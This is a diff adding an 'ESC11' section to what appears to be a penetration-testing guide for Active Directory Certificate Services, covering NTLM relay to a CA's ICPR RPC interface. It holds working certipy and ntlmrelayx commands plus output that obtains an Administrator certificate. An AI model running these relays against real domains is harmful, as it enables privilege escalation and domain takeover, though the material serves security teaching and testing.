@@ -611,6 +611,64 @@ certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 
 This vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges and the absence of a `userPrincipalName` by default.
 
+## Relaying NTLM to ICPR - ESC11
+
+### Explanation
+
+If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
+
+You can use `certipy` to enumerate if `Enforce Encryption for Requests` is Disabled and certipy will show `ESC11` Vulnerabilities.
+
+```bash
+$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
+
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+Certificate Authorities
+  0
+    CA Name                             : DC01-CA
+    DNS Name                            : DC01.domain.local
+    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
+    ....
+    Enforce Encryption for Requests     : Disabled
+    ....
+    [!] Vulnerabilities
+      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+
+```
+
+### Abuse Scenario
+
+It need to setup a relay server: 
+
+``` bash
+$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting rpc://DC01.domain.local (ESC11)
+[*] Listening on 0.0.0.0:445
+[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
+[*] Attacking user 'Administrator@DOMAIN'
+[*] Template was not defined. Defaulting to Machine/User
+[*] Requesting certificate for user 'Administrator' with template 'User'
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 10
+[*] Got certificate with UPN 'Administrator@domain.local'
+[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+[*] Exiting...
+```
+
+Note: For domain controllers, we must specify `-template` in DomainController.
+
+Or using [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
+
+``` bash
+$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
+```
+
+
 ## Compromising Forests with Certificates Explained in Passive Voice
 
 ### Breaking of Forest Trusts by Compromised CAs
